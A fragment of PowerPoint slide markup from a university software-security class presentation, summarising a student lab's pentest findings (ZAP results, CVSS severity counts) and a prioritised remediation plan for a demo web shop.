          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2C7B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452360" y="529437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0" y="5257800"/>
            <a:ext cx="301752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0" y="527608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Systemic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5577840"/>
            <a:ext cx="68580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0080" y="559612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User Controllable HTML Attr (Potential XSS)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577840"/>
            <a:ext cx="137160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7452360" y="5614416"/>
            <a:ext cx="1097280" cy="24688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52360" y="5614416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Info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5577840"/>
            <a:ext cx="301752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686800" y="55961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2 endpoints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57200" y="5897879"/>
            <a:ext cx="68580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40080" y="5916167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t>Storable and Cacheable Content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315200" y="5897879"/>
            <a:ext cx="137160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452360" y="5934455"/>
            <a:ext cx="1097280" cy="246888"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6C75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452360" y="5934455"/>
            <a:ext cx="109728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Info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686800" y="5897879"/>
            <a:ext cx="3017520" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="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86800" y="591616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A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Systemic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7200" y="6355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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Reporte completo: evidencias/zap-scan/zap-report.html · Herramienta: ghcr.io/zaproxy/zaproxy:stable (Docker)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"/>
            <a:ext cx="12191695" cy="77724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003366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Conclusiones y Recomendaciones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7724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4A843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Fase 2: Blue Team — Remediaciones propuestas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7AE60"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>✅ Fase 1 Completada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10 amenazas STRIDE identificadas y validadas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5 vulnerabilidades demostradas con evidencia real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DFD validado contra la aplicación real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CVSS v3.1 calculado para cada hallazgo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Pentesting ejecutado: curl, sqlmap, PyJWT, ZAP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 b="1">
                <a:solidFill>
                  <a:srgbClr val="003366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>📊 Distribución de severidad:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 vulnerabilidad CRITICAL (CVSS 9.6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="E67E22"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 vulnerabilidad HIGH (CVSS 8.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>3 vulnerabilidades MEDIUM (CVSS 5.3-6.8)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="8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200" b="1">
                <a:solidFill>
                  <a:srgbClr val="003366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>📋 OWASP ZAP: 59 PASS, 9 WARN, 0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371600"/>
            <a:ext cx="530352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3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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>🔧 Plan de Remediación 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192024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Migrar JWT a RS256 con par de llaves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forja de tokens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P1: Validar ownership en carrito/pedidos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IDOR/BOLA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Sanitizar comentarios + CSP + HttpOnly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XSS almacenado y robo de cookie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P2: Parametrizar consultas SQL (EF Core)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SQLi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Rate limiting con Redis + lockout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Mitiga fuerza bruta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Mensaje uniforme en login + bcrypt + TOTP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Elimina enumeración, fortalece autenticación</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="4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100" b="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>P3: Tabla de auditoría</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="6C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ Trazabilidad de acciones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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>UNIVERSIDAD APEC · SEGURIDAD DE SOFTWARE ISW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¡Gracias!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4A843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>🛡️ UNAPEC Mini Shop Security Lab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840480"/>
            <a:ext cx="4876495" cy="18288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A8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Jean de los Santos   ·   Jose Canelo   ·   Rainiery Peña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4A843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Proyecto Integrador Avanzado · Fase 1 Red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Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Octubre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